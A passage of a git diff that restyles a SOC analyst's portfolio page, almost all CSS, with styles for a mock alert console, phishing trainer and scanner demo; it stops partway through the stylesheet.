@@ -1,359 +1,1083 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-<meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Yogendra Khadka | SOC Analyst Portfolio</title>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="Yogendra (Roman) Khadka - entry-level SOC Analyst in New York. Hands-on labs: honeypot alert triage, phishing analysis, malware scanning, Windows forensics.">
+<title>Yogendra Khadka Portfolio</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wdth,wght@75..100,500..800&family=Public+Sans:ital,wght@0,400;0,500;0,600;1,400&family=JetBrains+Mono:wght@400;500&display=swap">
 <style>
-:root {
-  --bg: #0d1117;
-  --surface: #161b22;
-  --surface2: #21262d;
-  --border: #30363d;
-  --green: #3fb950;
-  --blue: #58a6ff;
-  --orange: #f0883e;
-  --red: #ff7b72;
-  --purple: #d2a8ff;
-  --yellow: #e3b341;
-  --text: #e6edf3;
-  --muted: #8b949e;
+/* Layout: an analyst's case file. Quick facts and a working terminal up top, then experience, then each project as a hands-on lab with a build journal. */
+:root{
+  --bg:#F5F7FA; --surface:#FFFFFF; --ink:#0F2236; --muted:#4F5F72; --line:#D8DFE8;
+  --accent:#B45309; --accent-soft:#FDF1E3; --navy:#16395C; --code-bg:#EEF2F7;
+  --term-bg:#0F2236; --term-fg:#DCE6F0; --term-dim:#8FA3B8; --term-acc:#F2A541;
+  --sev-high:#B42318; --sev-high-bg:#FDECEA; --sev-med:#9A6700; --sev-med-bg:#FFF6DB;
+  --sev-low:#1F6F43; --sev-low-bg:#E6F4EC; --info:#1D4E89; --info-bg:#E7EFF9;
+  --f-display:"Archivo","Arial Narrow",system-ui,sans-serif;
+  --f-body:"Public Sans",system-ui,-apple-system,"Segoe UI",sans-serif;
+  --f-mono:"JetBrains Mono",ui-monospace,"SFMono-Regular",Menlo,Consolas,monospace;
+  --radius:10px;
 }
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-html { scroll-behavior: smooth; }
-body {
-  background: var(--bg);
-  color: var(--text);
-  font-family: 'JetBrains Mono', monospace;
-  font-size: 14px;
-  line-height: 1.6;
-  min-height: 100vh;
-}
-nav {
-  position: fixed; top: 0; left: 0; right: 0; z-index: 100;
-  background: rgba(13,17,23,0.95);
-  border-bottom: 1px solid var(--border);
-  backdrop-filter: blur(8px);
-  display: flex; align-items: center; justify-content: space-between;
-  padding: 0 32px; height: 52px;
-}
-.nav-brand { color: var(--green); font-size: 13px; font-weight: 600; }
-.nav-brand span { color: var(--muted); font-weight: 400; }
-.nav-links { display: flex; gap: 24px; list-style: none; }
-.nav-links a { color: var(--muted); text-decoration: none; font-size: 12px; transition: color 0.2s; }
-.nav-links a:hover { color: var(--green); }
-.status-dot { display: flex; align-items: center; gap: 8px; font-size: 11px; color: var(--muted); }
-.dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); animation: blink 2s infinite; }
-.hero {
-  min-height: 100vh;
-  display: flex; align-items: center; justify-content: center;
-  padding: 80px 32px 40px;
-}
-.terminal {
-  width: 100%; max-width: 780px;
-  background: var(--surface);
-  border: 1px solid var(--border);
-  border-radius: 10px;
-  overflow: hidden;
-  box-shadow: 0 32px 80px rgba(0,0,0,0.5);
-  animation: fadeIn 0.6s ease;
-}
-.terminal-bar {
-  background: var(--surface2);
-  padding: 10px 16px;
-  display: flex; align-items: center; gap: 8px;
-  border-bottom: 1px solid var(--border);
-}
-.btn-r { width: 12px; height: 12px; border-radius: 50%; background: #ff5f57; }
-.btn-y { width: 12px; height: 12px; border-radius: 50%; background: #febc2e; }
-.btn-g { width: 12px; height: 12px; border-radius: 50%; background: #28c840; }
-.terminal-title { flex: 1; text-align: center; font-size: 11px; color: var(--muted); }
-.terminal-body { padding: 28px 32px; min-height: 400px; }
-.ascii { color: var(--green); font-size: 11px; line-height: 1.3; display: block; margin-bottom: 16px; }
-.line { margin-bottom: 4px; }
-.prompt { color: var(--green); margin-right: 8px; }
-.cmd { color: var(--blue); }
-.arg { color: var(--orange); }
-.out { color: var(--text); display: block; margin: 1px 0; }
-.out-dim { color: var(--muted); display: block; margin: 1px 0; }
-.out-green { color: var(--green); display: block; margin: 1px 0; }
-.out-purple { color: var(--purple); display: block; }
-.out-yellow { color: var(--yellow); display: block; }
-.sp { display: block; height: 12px; }
-.cursor { display: inline-block; width: 8px; height: 14px; background: var(--green); animation: blink 1s infinite; vertical-align: middle; margin-left: 2px; }
-.main { max-width: 900px; margin: 0 auto; padding: 0 32px 80px; }
-.section { padding: 64px 0; border-top: 1px solid var(--border); }
-.section-header { display: flex; align-items: center; gap: 12px; margin-bottom: 40px; }
-.section-num { color: var(--green); font-size: 12px; font-weight: 600; }
-.section-title { color: var(--text); font-size: 18px; font-weight: 600; font-family: 'Inter', sans-serif; }
-.section-line { flex: 1; height: 1px; background: var(--border); }
-.about-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
-.block { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 24px; }
-.block-title { color: var(--muted); font-size: 11px; letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 16px; }
-.about-text { color: var(--muted); font-family: 'Inter', sans-serif; font-size: 14px; line-height: 1.8; }
-.about-text strong { color: var(--text); }
-.cert-row { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid var(--border); }
-.cert-row:last-child { border-bottom: none; }
-.cert-icon { color: var(--yellow); }
-.cert-name { font-family: 'Inter', sans-serif; font-size: 13px; color: var(--text); flex: 1; }
-.cert-badge { font-size: 10px; color: var(--muted); background: var(--surface2); padding: 2px 8px; border-radius: 4px; white-space: nowrap; }
-.exp-item { display: grid; grid-template-columns: 180px 1fr; gap: 32px; padding: 32px 0; border-bottom: 1px solid var(--border); }
-.exp-item:last-child { border-bottom: none; }
-.exp-date { font-size: 11px; color: var(--green); font-weight: 600; margin-bottom: 4px; }
-.exp-loc { font-size: 11px; color: var(--muted); }
-.exp-role { font-family: 'Inter', sans-serif; font-size: 16px; font-weight: 600; color: var(--text); margin-bottom: 4px; }
-.exp-org { font-size: 12px; color: var(--blue); margin-bottom: 16px; }
-.exp-bullets { list-style: none; display: flex; flex-direction: column; gap: 8px; }
-.exp-bullets li { font-family: 'Inter', sans-serif; font-size: 13px; color: var(--muted); line-height: 1.7; padding-left: 18px; position: relative; }
-.exp-bullets li::before { content: '▸'; position: absolute; left: 0; color: var(--green); font-size: 10px; top: 3px; }
-.exp-bullets li strong { color: var(--text); }
-.projects-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 16px; }
-.project-card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 24px; transition: border-color 0.2s, transform 0.2s; display: flex; flex-direction: column; gap: 12px; }
-.project-card:hover { border-color: var(--green); transform: translateY(-2px); }
-.project-top { display: flex; justify-content: space-between; align-items: flex-start; }
-.folder { color: var(--blue); font-size: 22px; }
-.proj-link { color: var(--muted); text-decoration: none; font-size: 12px; transition: color 0.2s; }
-.proj-link:hover { color: var(--text); }
-.proj-name { font-family: 'Inter', sans-serif; font-size: 15px; font-weight: 600; color: var(--text); }
-.proj-desc { font-family: 'Inter', sans-serif; font-size: 13px; color: var(--muted); line-height: 1.7; flex: 1; }
-.proj-tags { display: flex; flex-wrap: wrap; gap: 8px; }
-.p-tag { font-size: 11px; color: var(--muted); }
-.skills-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 16px; }
-.skill-block { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 20px; }
-.skill-title { font-size: 11px; color: var(--green); letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 12px; }
-.skill-title::before { content: '// '; color: var(--border); }
-.skill-list { display: flex; flex-direction: column; gap: 6px; }
-.skill-item { font-family: 'Inter', sans-serif; font-size: 13px; color: var(--muted); display: flex; align-items: center; gap: 8px; }
-.skill-item::before { content: ''; width: 4px; height: 4px; border-radius: 50%; background: var(--green); flex-shrink: 0; }
-.contact-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
-.contact-terminal { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
-.ct-bar { background: var(--surface2); padding: 8px 16px; border-bottom: 1px solid var(--border); display: flex; gap: 6px; }
-.ct-body { padding: 20px; }
-.contact-link { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid var(--border); text-decoration: none; transition: color 0.2s; }
-.contact-link:last-child { border-bottom: none; }
-.ck { color: var(--blue); font-size: 12px; width: 80px; flex-shrink: 0; }
-.cv { color: var(--muted); font-family: 'Inter', sans-serif; font-size: 13px; transition: color 0.2s; }
-.contact-link:hover .cv { color: var(--green); }
-.avail-block { background: rgba(63,185,80,0.05); border: 1px solid rgba(63,185,80,0.2); border-radius: 8px; padding: 28px; display: flex; flex-direction: column; gap: 16px; justify-content: center; }
-.avail-title { font-family: 'Inter', sans-serif; font-size: 20px; font-weight: 600; color: var(--text); }
-.avail-desc { font-family: 'Inter', sans-serif; font-size: 13px; color: var(--muted); line-height: 1.7; }
-.avail-badge { display: inline-flex; align-items: center; gap: 8px; background: rgba(63,185,80,0.1); border: 1px solid rgba(63,185,80,0.3); color: var(--green); padding: 8px 16px; border-radius: 6px; font-size: 12px; font-weight: 600; width: fit-content; }
-footer { border-top: 1px solid var(--border); padding: 24px 32px; max-width: 900px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
-footer p { font-size: 11px; color: var(--muted); }
-footer span { color: var(--green); }
-@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
-@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-@media (max-width: 700px) {
-  .nav-links { display: none; }
-  .hero { padding: 70px 16px 32px; }
-  .terminal-body { padding: 20px; }
-  .main { padding: 0 16px 60px; }
-  .about-grid, .contact-grid { grid-template-columns: 1fr; }
-  .exp-item { grid-template-columns: 1fr; gap: 8px; }
-  footer { flex-direction: column; gap: 8px; text-align: center; }
-}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){
+  --bg:#0D1520; --surface:#131E2C; --ink:#E6EDF5; --muted:#9AA9BA; --line:#25364A;
+  --accent:#F2A541; --accent-soft:#2A2114; --navy:#8DB8E8; --code-bg:#0A111A;
+  --term-bg:#070C13; --term-fg:#DCE6F0; --term-dim:#7F93A8; --term-acc:#F2A541;
+  --sev-high:#FF8A80; --sev-high-bg:#3A1A19; --sev-med:#F5C451; --sev-med-bg:#352B12;
+  --sev-low:#6FD39A; --sev-low-bg:#132E20; --info:#8DB8E8; --info-bg:#15263A; color-scheme:dark}}
+:root[data-theme="dark"]{
+  --bg:#0D1520; --surface:#131E2C; --ink:#E6EDF5; --muted:#9AA9BA; --line:#25364A;
+  --accent:#F2A541; --accent-soft:#2A2114; --navy:#8DB8E8; --code-bg:#0A111A;
+  --term-bg:#070C13; --term-fg:#DCE6F0; --term-dim:#7F93A8; --term-acc:#F2A541;
+  --sev-high:#FF8A80; --sev-high-bg:#3A1A19; --sev-med:#F5C451; --sev-med-bg:#352B12;
+  --sev-low:#6FD39A; --sev-low-bg:#132E20; --info:#8DB8E8; --info-bg:#15263A; color-scheme:dark}
+
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+@media (prefers-reduced-motion: reduce){html{scroll-behavior:auto}*{transition:none!important;animation:none!important}}
+body{background:var(--bg);color:var(--ink);font-family:var(--f-body);font-size:16px;line-height:1.6;margin:0}
+a{color:var(--navy);text-underline-offset:3px}
+a:hover{color:var(--accent)}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+button{font:inherit;color:inherit}
+.wrap{max-width:1100px;margin:0 auto;padding-inline:20px}
+h1,h2,h3,h4{font-family:var(--f-display);text-wrap:balance;margin:0;line-height:1.15}
+h2{font-size:clamp(1.6rem,3.2vw,2.1rem);font-weight:800;font-stretch:85%;letter-spacing:-.01em}
+h3{font-size:1.25rem;font-weight:700;font-stretch:90%}
+p{margin:0}
+.eyebrow{font-family:var(--f-mono);font-size:.74rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);font-weight:500}
+.muted{color:var(--muted)}
+.mono{font-family:var(--f-mono);font-size:.86em}
+.sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)}
+
+/* nav */
+.nav{position:sticky;top:env(safe-area-inset-top,0px);z-index:20;background:color-mix(in srgb,var(--bg) 90%,transparent);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
+.nav .wrap{display:flex;align-items:center;justify-content:space-between;gap:16px;padding-block:12px}
+.brand{font-family:var(--f-display);font-weight:800;font-stretch:80%;font-size:1.15rem;letter-spacing:.02em;color:var(--ink);text-decoration:none}
+.brand span{color:var(--accent)}
+.nav ul{display:flex;gap:18px;list-style:none;margin:0;padding:0;flex-wrap:wrap}
+.nav ul a{color:var(--muted);text-decoration:none;font-size:.9rem;font-weight:500}
+.nav ul a:hover{color:var(--ink)}
+@media (max-width:820px){.nav ul{display:none}}
+
+/* hero */
+.hero{padding-block:52px 28px}
+.hero-grid{display:grid;grid-template-columns:1.35fr 1fr;gap:40px;align-items:start}
+.hero h1{font-size:clamp(2.6rem,7vw,4.6rem);font-weight:800;font-stretch:75%;letter-spacing:-.015em;line-height:.98;margin-top:14px}
+.hero h1 .alias{display:block;font-size:.38em;font-stretch:90%;font-weight:600;color:var(--muted);letter-spacing:0;margin-top:10px}
+.lede{font-size:1.12rem;max-width:58ch;margin-top:20px}
+.status{display:inline-flex;align-items:center;gap:8px;font-size:.85rem;font-weight:600;color:var(--sev-low);background:var(--sev-low-bg);padding:5px 12px;border-radius:999px}
+.status i{width:8px;height:8px;border-radius:50%;background:var(--sev-low);display:block;animation:pulse 2s infinite}
+@keyframes pulse{50%{opacity:.35}}
+.cta{display:flex;flex-wrap:wrap;gap:10px;margin-top:26px}
+.btn{display:inline-flex;align-items:center;gap:8px;font-weight:600;font-size:.93rem;padding:10px 16px;border-radius:8px;border:1px solid var(--line);background:var(--surface);color:var(--ink);text-decoration:none;cursor:pointer;font-family:var(--f-body);line-height:1.3}
+.btn:hover{border-color:var(--accent);color:var(--ink)}
+.btn.primary{background:var(--ink);color:var(--bg);border-color:var(--ink)}
+.btn.primary:hover{background:var(--accent);border-color:var(--accent);color:#fff}
+.btn:disabled{opacity:.5;cursor:not-allowed}
+.btn.sm{padding:6px 11px;font-size:.84rem}
+.facts{background:var(--surface);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden}
+.facts-head{display:flex;justify-content:space-between;align-items:center;padding:12px 18px;border-bottom:1px solid var(--line);background:var(--code-bg)}
+.facts-head .mono{font-size:.75rem;color:var(--muted)}
+.facts dl{margin:0;display:grid;grid-template-columns:auto 1fr}
+.facts dt,.facts dd{padding:10px 18px;border-bottom:1px solid var(--line);margin:0;font-size:.92rem}
+.facts dt{color:var(--muted);font-family:var(--f-mono);font-size:.74rem;text-transform:uppercase;letter-spacing:.06em;padding-top:12px}
+.facts dd{font-weight:500}
+.facts dl > :nth-last-child(-n+2){border-bottom:0}
+@media (max-width:860px){.hero-grid{grid-template-columns:1fr}}
+
+/* terminal */
+.term{margin-top:34px;background:var(--term-bg);color:var(--term-fg);border-radius:12px;overflow:hidden;font-family:var(--f-mono);font-size:.84rem}
+.term-bar{display:flex;align-items:center;justify-content:space-between;gap:10px;padding:9px 14px;border-bottom:1px solid color-mix(in srgb,var(--term-fg) 14%,transparent);flex-wrap:wrap}
+.term-bar span{color:var(--term-dim);font-size:.75rem}
+.dots{display:flex;gap:6px}.dots i{width:10px;height:10px;border-radius:50%;background:color-mix(in srgb,var(--term-fg) 25%,transparent);display:block}
+.term-out{padding:14px 16px 4px;height:230px;overflow-y:auto;white-space:pre-wrap;overflow-wrap:anywhere;line-height:1.55}
+.term-out .p{color:var(--term-acc)}
+.term-out .d{color:var(--term-dim)}
+.term-out a{color:var(--term-acc)}
+.term-in{display:flex;align-items:center;gap:8px;padding:6px 16px 12px}
+.term-in label{color:var(--term-acc);white-space:nowrap}
+.term-in input{flex:1;min-width:0;background:transparent;border:0;color:var(--term-fg);font:inherit;outline:none;caret-color:var(--term-acc)}
+.term-chips{display:flex;flex-wrap:wrap;gap:6px;padding:0 16px 14px}
+.term-chips button{all:unset;cursor:pointer;font-size:.74rem;padding:3px 10px;border-radius:999px;border:1px solid color-mix(in srgb,var(--term-fg) 22%,transparent);color:var(--term-dim)}
+.term-chips button:hover,.term-chips button:focus-visible{color:var(--term-acc);border-color:var(--term-acc)}
+
+/* sections */
+section{padding-block:56px}
+section + section{border-top:1px solid var(--line)}
+.sec-head{display:grid;gap:8px;margin-bottom:28px;max-width:72ch}
+.sec-head p{color:var(--muted)}
+
+/* experience */
+.job{display:grid;grid-template-columns:220px 1fr;gap:28px;padding-block:22px;border-top:1px solid var(--line)}
+.job:first-of-type{border-top:0;padding-top:0}
+.job-meta{display:grid;gap:4px;align-content:start}
+.job-meta .when{font-family:var(--f-mono);font-size:.82rem;color:var(--accent)}
+.job-meta .where{font-size:.9rem;color:var(--muted)}
+.job h3{margin-bottom:10px}
+.job ul{margin:0;padding-left:1.1rem;display:grid;gap:6px}
+.job li{max-width:75ch}
+.tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:14px}
+.tag{font-family:var(--f-mono);font-size:.74rem;padding:3px 9px;border-radius:5px;background:var(--code-bg);color:var(--muted);border:1px solid var(--line)}
+@media (max-width:760px){.job{grid-template-columns:1fr;gap:10px}}
+
+/* project index */
+.pindex{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-bottom:26px}
+.pindex a{display:grid;gap:4px;padding:12px 14px;border:1px solid var(--line);border-radius:8px;background:var(--surface);text-decoration:none;color:var(--ink);min-width:0}
+.pindex a:hover{border-color:var(--accent);color:var(--ink)}
+.pindex b{font-size:.9rem;line-height:1.3}
+.pindex span{font-family:var(--f-mono);font-size:.7rem;color:var(--muted)}
+@media (max-width:900px){.pindex{grid-template-columns:repeat(2,1fr)}}
+
+/* project */
+.proj{background:var(--surface);border:1px solid var(--line);border-radius:var(--radius);padding:28px;display:grid;gap:22px;scroll-margin-top:70px}
+.proj + .proj{margin-top:24px}
+.proj-top{display:grid;grid-template-columns:1fr auto;gap:16px;align-items:start}
+.proj-top h3{font-size:1.55rem;margin-top:6px}
+.proj-top p{margin-top:8px;max-width:72ch;color:var(--muted)}
+.pill{font-family:var(--f-mono);font-size:.72rem;padding:4px 10px;border-radius:999px;white-space:nowrap;font-weight:500}
+.pill.on{background:var(--sev-low-bg);color:var(--sev-low)}
+.pill.done{background:var(--info-bg);color:var(--info)}
+.pill.prog{background:var(--sev-med-bg);color:var(--sev-med)}
+.three{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.three > div{min-width:0}
+.three h4{font-family:var(--f-mono);font-size:.72rem;text-transform:uppercase;letter-spacing:.1em;color:var(--accent);margin:0 0 6px;font-weight:500}
+.three p{font-size:.93rem}
+@media (max-width:760px){.three{grid-template-columns:1fr}.proj{padding:18px}.proj-top{grid-template-columns:1fr}}
+
+/* tabs */
+.tabs{display:flex;gap:4px;border-bottom:1px solid var(--line);flex-wrap:wrap}
+.tabs button{all:unset;cursor:pointer;padding:9px 14px;font-weight:600;font-size:.9rem;color:var(--muted);border-bottom:2px solid transparent;margin-bottom:-1px}
+.tabs button[aria-selected="true"]{color:var(--ink);border-bottom-color:var(--accent)}
+.tabs button:focus-visible{outline:2px solid var(--accent)}
+.tabs .count{font-family:var(--f-mono);font-size:.7rem;color:var(--muted);margin-left:6px}
+
+.demo{border:1px solid var(--line);border-radius:8px;overflow:hidden;background:var(--bg)}
+.demo-bar{display:flex;flex-wrap:wrap;justify-content:space-between;align-items:center;gap:8px;padding:10px 14px;border-bottom:1px solid var(--line);background:var(--code-bg)}
+.demo-bar b{font-family:var(--f-mono);font-size:.78rem;font-weight:500}
+.sample{font-family:var(--f-mono);font-size:.7rem;color:var(--muted);border:1px dashed var(--line);padding:2px 8px;border-radius:4px}
+.howto{padding:10px 14px;font-size:.86rem;color:var(--muted);border-bottom:1px solid var(--line);background:var(--surface)}
+.howto b{color:var(--ink)}
+.chip{all:unset;cursor:pointer;font-family:var(--f-mono);font-size:.72rem;padding:4px 10px;border-radius:999px;border:1px solid var(--line);color:var(--muted);background:var(--surface)}
+.chip[aria-pressed="true"]{background:var(--ink);color:var(--bg);border-color:var(--ink)}
+.chip:focus-visible{outline:2px solid var(--accent)}
+.chips{display:flex;flex-wrap:wrap;gap:6px}
+.sev{font-family:var(--f-mono);font-size:.66rem;font-weight:500;padding:2px 7px;border-radius:4px;text-transform:uppercase;letter-spacing:.05em;align-self:start;white-space:nowrap}
+.sev.high{background:var(--sev-high-bg);color:var(--sev-high)}
+.sev.med{background:var(--sev-med-bg);color:var(--sev-med)}
+.sev.low{background:var(--sev-low-bg);color:var(--sev-low)}
+.sev.info{background:var(--info-bg);color:var(--info)}
+pre.code{margin:0;background:var(--code-bg);border:1px solid var(--line);border-radius:6px;padding:12px;font-family:var(--f-mono);font-size:.74rem;line-height:1.55;overflow-x:auto;white-space:pre}
+.feedback{padding:10px 12px;border-radius:6px;font-size:.88rem}
+.feedback.good{background:var(--sev-low-bg)}
+.feedback.bad{background:var(--sev-high-bg)}
+.feedback.neutral{background:var(--info-bg)}
+.feedback b{display:block;margin-bottom:2px}
+
+/* diagram */
+.diagram{overflow-x:auto;padding:18px}
+.diagram svg{display:block;min-width:640px;width:100%;height:auto}
+.diagram text{font-family:var(--f-mono);fill:var(--ink)}
+.diagram .sub{fill:var(--muted)}
+
+/* SOC console */
+.console{display:grid;grid-template-columns:1fr 1.1fr}
+.queue{border-right:1px solid var(--line);min-width:0;display:flex;flex-direction:column}
+.queue-tools{display:flex;justify-content:space-between;align-items:center;gap:8px;padding:10px 12px;border-bottom:1px solid var(--line);flex-wrap:wrap}
+.queue ul{list-style:none;margin:0;padding:0}
+.queue li button{all:unset;box-sizing:border-box;display:grid;grid-template-columns:auto 1fr auto;gap:3px 10px;width:100%;padding:10px 12px;border-bottom:1px solid var(--line);cursor:pointer;font-size:.8rem}
+.queue li button:hover{background:var(--surface)}
+.queue li button[aria-selected="true"]{background:var(--surface);box-shadow:inset 3px 0 0 var(--accent)}
+.queue li button:focus-visible{outline:2px solid var(--accent);outline-offset:-2px}
+.q-time{font-family:var(--f-mono);color:var(--muted);font-variant-numeric:tabular-nums;font-size:.74rem}
+.q-type{font-family:var(--f-mono);font-size:.76rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.q-sum{grid-column:2 / 4;color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.q-state{font-family:var(--f-mono);font-size:.66rem;padding:1px 6px;border-radius:4px;border:1px solid var(--line);color:var(--muted);justify-self:end}
+.q-state.tp{background:var(--sev-high-bg);color:var(--sev-high);border-color:transparent}
+.q-state.fp{background:var(--sev-low-bg);color:var(--sev-low);border-color:transparent}
+.detail{padding:16px;display:grid;gap:12px;align-content:start;min-width:0}
+.kv{display:grid;grid-template-columns:auto 1fr;gap:6px 14px;font-size:.87rem}
+.kv > span:nth-child(odd){color:var(--muted);font-family:var(--f-mono);font-size:.72rem;text-transform:uppercase;letter-spacing:.05em;padding-top:2px}
+.actions{display:flex;flex-wrap:wrap;gap:8px}
+.attack{display:grid;grid-template-columns:repeat(6,1fr);gap:6px;padding:12px;border-top:1px solid var(--line)}
+.tac{border:1px solid var(--line);border-radius:6px;padding:8px;font-size:.74rem;background:var(--surface);min-width:0;transition:background .25s,border-color .25s}
+.tac b{display:block;font-family:var(--f-mono);font-size:.64rem;color:var(--muted);text-transform:uppercase;letter-spacing:.05em;font-weight:500}
+.tac.lit{background:var(--sev-high-bg);border-color:var(--sev-high)}
+.tac.lit b{color:var(--sev-high)}
+.console-foot{display:grid;grid-template-columns:1fr 1fr;gap:0;border-top:1px solid var(--line)}
+.console-foot > div{padding:12px 14px;min-width:0}
+.console-foot > div + div{border-left:1px solid var(--line)}
+.console-foot h4{font-family:var(--f-mono);font-size:.7rem;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);font-weight:500;margin-bottom:8px}
+.ioc{display:flex;flex-wrap:wrap;gap:6px}
+.ioc span{font-family:var(--f-mono);font-size:.72rem;padding:2px 8px;border-radius:4px;background:var(--code-bg);border:1px solid var(--line);overflow-wrap:anywhere}
+.bar{height:8px;background:var(--line);border-radius:99px;overflow:hidden}
+.bar i{display:block;height:100%;width:0;background:var(--accent);transition:width .3s}
+.report-box{padding:14px;border-top:1px solid var(--line);background:var(--surface);font-size:.9rem}
+.report-box[hidden]{display:none!important}
+@media (max-width:860px){.console{grid-template-columns:1fr}.queue{border-right:0;border-bottom:1px solid var(--line)}.attack{grid-template-columns:repeat(3,1fr)}.console-foot{grid-template-columns:1fr}.console-foot > div + div{border-left:0;border-top:1px solid var(--line)}}
+
+/* phishing trainer */
+.inbox-steps{display:flex;gap:6px;padding:10px 14px;border-bottom:1px solid var(--line);flex-wrap:wrap;align-items:center;background:var(--surface)}
+.inbox-steps button{all:unset;cursor:pointer;font-size:.8rem;padding:5px 10px;border-radius:6px;border:1px solid var(--line);display:flex;gap:6px;align-items:center}
+.inbox-steps button[aria-current="true"]{border-color:var(--accent);background:var(--accent-soft)}
+.inbox-steps button .ok{color:var(--sev-low);font-weight:700}
+.phish{display:grid;grid-template-columns:1.3fr 1fr}
+.email{padding:18px;border-right:1px solid var(--line);min-width:0;font-size:.93rem;background:var(--surface)}
+.email .hdr{display:grid;grid-template-columns:auto 1fr;gap:5px 12px;padding-bottom:12px;border-bottom:1px solid var(--line);margin-bottom:14px;font-size:.86rem}
+.email .hdr > span:nth-child(odd){color:var(--muted)}
+.email .hdr > span{min-width:0;overflow-wrap:anywhere}
+.email .body p + p{margin-top:10px}
+.part{all:unset;cursor:pointer;border-radius:3px;padding:0 2px;margin:0 -2px;box-decoration-break:clone;-webkit-box-decoration-break:clone}
+.part:hover{background:var(--accent-soft);outline:1px dashed var(--accent)}
+.part:focus-visible{outline:2px solid var(--accent)}
+.part.hit{background:var(--sev-high-bg);color:var(--sev-high);text-decoration:underline wavy;text-decoration-thickness:1px;text-underline-offset:3px}
+.part.ok{background:var(--sev-low-bg);color:var(--sev-low)}
+.part.hint{animation:hint 1s 3}
+@keyframes hint{50%{background:var(--accent-soft);outline:2px solid var(--accent)}}
+.ebtn{display:inline-block;margin-top:12px;padding:8px 14px;background:var(--navy);color:var(--bg)!important;border-radius:5px;font-weight:600;font-size:.85rem}
+.ebtn.hit{background:var(--sev-high);color:#fff!important;text-decoration:none}
+.ebtn.ok{background:var(--sev-low);color:#fff!important}
+.att{margin-top:14px;font-family:var(--f-mono);font-size:.8rem;padding:8px 10px;border:1px solid var(--line);border-radius:5px;display:inline-block}
+.side{padding:16px;display:grid;gap:12px;align-content:start;min-width:0}
+.side h4{font-family:var(--f-mono);font-size:.7rem;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);font-weight:500}
+.notes{display:grid;gap:8px;font-size:.86rem;max-height:250px;overflow-y:auto}
+.note{padding:8px 10px;border-radius:6px;border-left:3px solid var(--line);background:var(--surface)}
+.note.r{border-left-color:var(--sev-high)}
+.note.g{border-left-color:var(--sev-low)}
+.note b{display:block;font-size:.84rem}
+.verdicts{display:grid;grid-template-columns:1fr 1fr;gap:6px}
+.verdicts button{all:unset;cursor:pointer;text-align:center;padding:8px;border:1px solid var(--line);border-radius:6px;font-size:.84rem;font-weight:600;background:var(--surface)}
+.verdicts button:hover{border-color:var(--accent)}
+.verdicts button:focus-visible{outline:2px solid var(--accent)}
+.verdicts button.right{background:var(--sev-low-bg);border-color:var(--sev-low)}
+.verdicts button.wrong{background:var(--sev-high-bg);border-color:var(--sev-high)}
+.verdicts button:disabled{cursor:default}
+.playbook{margin:0;padding-left:1.2rem;font-size:.86rem;display:grid;gap:4px}
+@media (max-width:860px){.phish{grid-template-columns:1fr}.email{border-right:0;border-bottom:1px solid var(--line)}}
+
+/* scanner */
+.samples{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;padding:14px}
+.samples button,.samples label{all:unset;box-sizing:border-box;cursor:pointer;display:grid;gap:3px;padding:10px 12px;border:1px solid var(--line);border-radius:8px;background:var(--surface);min-width:0}
+.samples button[aria-pressed="true"],.samples label.sel{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-soft)}
+.samples button:focus-visible,.samples label:focus-within{outline:2px solid var(--accent)}
+.samples b{font-family:var(--f-mono);font-size:.78rem;overflow-wrap:anywhere}
+.samples span{font-size:.78rem;color:var(--muted)}
+.samples input{position:absolute;opacity:0;width:1px;height:1px}
+@media (max-width:860px){.samples{grid-template-columns:1fr 1fr}}
+.pipe{display:grid;grid-template-columns:repeat(5,1fr);padding:0 14px 14px}
+.step{position:relative;padding:10px;border:1px solid var(--line);background:var(--surface);border-radius:6px;font-size:.8rem;min-width:0;transition:border-color .2s,box-shadow .2s}
+.step + .step{margin-left:14px}
+.step + .step::before{content:"";position:absolute;left:-15px;top:50%;width:14px;height:1px;background:var(--muted)}
+.step b{display:block;font-family:var(--f-mono);font-size:.7rem;color:var(--accent);font-weight:500;margin-bottom:2px}
